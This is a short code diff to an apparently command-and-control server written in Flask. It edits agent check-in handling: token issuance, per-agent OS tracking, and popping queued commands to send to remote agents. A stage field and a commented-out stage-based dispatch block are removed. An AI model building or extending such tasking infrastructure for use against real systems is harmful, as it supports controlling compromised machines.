@@ -178,12 +178,7 @@ def check_in():
     try:
         data = request.get_json(force=True)
         aid = data['aid']
-        stg = data['stg']
         ops = data['ops']
-
-        if not stg:
-            logging.warning("Received invalid stage command")
-            return jsonify({"error": "Missing agent ID"}), 400
         
         if not ops:
             logging.warning("Received invalid os identification command")
@@ -196,7 +191,6 @@ def check_in():
         agent_orders[aid] = get_order(ops)
 
         agent_metrics[aid] = {
-            'stg': stg,
             'ops': ops,
             'last_checkin': checkin_time,
             'token': token
@@ -204,7 +198,7 @@ def check_in():
 
         token_to_agent[token] = aid
 
-        logging.info(f"Agent '{stg}' with OS '{ops}' checked in at {checkin_time:.2f}. Token issued.")
+        logging.info(f"Agent '{aid}' with OS '{ops}' checked in at {checkin_time:.2f}. Token issued.")
 
         resp = {
             'status': 'Success', 
@@ -244,12 +238,6 @@ def c2_endpoint():
         checkin_time = time.time()
         agent_metrics.setdefault((agent_id), {})['last_checkin'] = checkin_time
         logging.info(f"Agent aid={agent_id} checked in at {checkin_time:.2f}")
-
-        # if(order.get(stg) and len(order[stg][ops]) > 0):
-        #     command_data = order[stg][ops].pop(0)
-        #     command_text = command_data.get("cmd")
-        # else:
-        #     command_text = "NOP"
 
         if(agent_orders.get(agent_id) and len(agent_orders[agent_id]) > 0):
             command_data = agent_orders[agent_id].pop(0)
